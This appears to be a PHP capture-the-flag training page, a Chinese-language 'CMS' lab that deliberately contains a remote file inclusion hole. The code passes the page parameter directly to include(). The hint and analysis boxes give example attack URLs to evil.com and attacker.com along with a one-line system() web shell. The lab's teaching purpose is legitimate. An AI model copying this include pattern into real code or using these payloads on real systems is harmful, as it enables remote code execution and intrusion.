<?php
$page = $_GET['page'] ?? 'home';

// VULNERABLE: Remote File Inclusion (RFI) enabled
// allow_url_include is On (misconfigured)
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Inclusion Simple - RFI</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #f5f5f5; font-family: -apple-system, sans-serif; padding: 2rem; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #3b82f6; margin-bottom: 0.5rem; }
        .subtitle { color: #a1a1aa; margin-bottom: 2rem; font-size: 0.9rem; }
        .hint { background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px; padding: 1rem; margin-bottom: 2rem; }
        .hint h3 { color: #3b82f6; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .hint p { color: #a1a1aa; font-size: 0.85rem; }
        .hint code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
        .nav { display: flex; gap: 1rem; margin-bottom: 2rem; }
        .nav a {
            padding: 0.5rem 1rem; background: #27272a; color: #f5f5f5; text-decoration: none;
            border-radius: 8px; font-size: 0.9rem;
        }
        .nav a:hover { background: #3f3f46; }
        .nav a.active { background: #3b82f6; color: white; }
        .content {
            background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px;
            padding: 2rem; margin-bottom: 2rem; min-height: 200px;
        }
        .content h2 { margin-bottom: 1rem; }
        .content p { color: #a1a1aa; line-height: 1.6; }
        .info { background: #0a0a1a; border: 1px solid #00003f; border-radius: 8px; padding: 1rem; margin-top: 2rem; }
        .info h3 { color: #3b82f6; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .info p { color: #a1a1aa; font-size: 0.85rem; }
        .info code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>小型网站 CMS</h1>
        <p class="subtitle">页面管理系统 (RFI) | CyberRange File Inclusion Simple Lab</p>

        <div class="hint">
            <h3>学习目标</h3>
            <p>这是一个远程文件包含 (RFI) 靶场。服务器配置允许包含远程 URL。</p>
            <p>攻击者可以包含远程服务器上的恶意 PHP 文件，实现远程代码执行。</p>
            <p>试试: <code>?page=http://evil.com/shell.txt</code></p>
            <p>或者: <code>?page=http://evil.com/shell.txt%00</code> (null byte)</p>
        </div>

        <div class="nav">
            <a href="?page=home" class="<?php echo $page === 'home' ? 'active' : ''; ?>">首页</a>
            <a href="?page=about" class="<?php echo $page === 'about' ? 'active' : ''; ?>">关于</a>
            <a href="?page=contact" class="<?php echo $page === 'contact' ? 'active' : ''; ?>">联系我们</a>
        </div>

        <div class="content">
            <?php
            // VULNERABLE: Remote File Inclusion
            if (strpos($page, '://') !== false || strpos($page, '//') === 0) {
                // Include remote URL
                include($page);
            } else {
                $file = "pages/" . $page . ".php";
                if (file_exists($file)) {
                    include($file);
                } else {
                    include($page);
                }
            }
            ?>
        </div>

        <div class="info">
            <h3>漏洞分析</h3>
            <p>代码检查用户输入是否包含 URL 协议（<code>://</code> 或 <code>//</code>）。</p>
            <p>如果检测到 URL，会直接包含远程文件：</p>
            <p><code>if (strpos($page, '://') !== false) include($page);</code></p>
            <p>攻击者可以托管恶意 PHP 文件并包含它：</p>
            <p><code>?page=http://attacker.com/shell.php</code></p>
            <p>远程文件可以包含 <code>&lt;?php system($_GET['cmd']); ?&gt;</code> 实现 RCE</p>
            <p>flag 格式: <code>CR{...}</code></p>
        </div>
    </div>
</body>
</html>
